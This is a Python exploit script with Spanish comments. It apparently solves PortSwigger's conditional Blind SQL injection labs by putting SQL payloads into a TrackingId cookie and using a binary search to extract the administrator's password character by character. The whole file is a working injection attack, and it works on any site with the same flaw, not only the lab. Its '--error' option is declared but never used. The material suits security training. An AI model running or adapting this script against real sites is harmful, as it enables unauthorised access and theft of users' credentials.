#!/usr/bin/env python

# Ookami
# Hackers Fight Club

"""
Imports
"""
import requests
import argparse

"""
Función principal
"""
def main():

    """
    Parser de argumentos
    """

    # Configuración del parser
    parser = argparse.ArgumentParser(description="PoC que implementa la solución a los laboratorios de Blind SQLi condicionales")
    parser.add_argument("url", type=str, help="URL del laboratorio de Blind SQLi de PortSwigger")
    parser.add_argument("expected_string", type=str, help="Cadena de texto que se espera al realizar la inyección")
    parser.add_argument("--error", dest="error", action="store_true", help="Realiza una inyección de tipo error condicional")

    # Parseo de argumentos
    args = parser.parse_args()

    """
    Alfabeto
    """

    # Mayúsculas, minúsculas y números
    # alfabeto=[chr(num) for num in range(48,123) if chr(num).isalnum()]

    # Minúsculas y números
    alfabeto=[chr(num) for num in range(48,58)]+ [chr(num) for num in range(97,123)]

    """
    Preparación
    """

    # Variables
    condition=args.expected_string
    password=''
    pos=0

    # Booleano que marca el final de la contraseña
    found = True

    # Sesión de requests
    session=requests.Session()

    """
    Comienza la extracción de la contraseña
    """
    while found:

        # Ajuste de variables
        found = False
        pos +=1
        head=0
        tail=len(alfabeto)

        # Busqueda binaria
        while head < tail:
            half= (head+tail) // 2
            car = alfabeto[half]
            inyeccion_1=f"' OR SUBSTRING((SELECT password FROM users WHERE username='administrator'),{pos},1) = '{car}' -- -"
            inyeccion_2=f"' OR SUBSTRING((SELECT password FROM users WHERE username='administrator'),{pos},1) < '{car}' -- -"
            cookies={ 'TrackingId': inyeccion_1}
            response = session.get(args.url,cookies=cookies)
            if condition in response.text:
                found = True
                print(f"\r{password+car}",end='',flush=True)
                password+=car
                break
            else:
                cookies = { 'TrackingId' : inyeccion_2 }
                response = session.get(args.url,cookies=cookies)
                if condition in response.text:
                    tail=half
                else:
                    head=half+1
    print()

    print(f'Contraseña de Administrator: {password}')

"""
Ejecución
"""
if __name__ == '__main__':
    main()
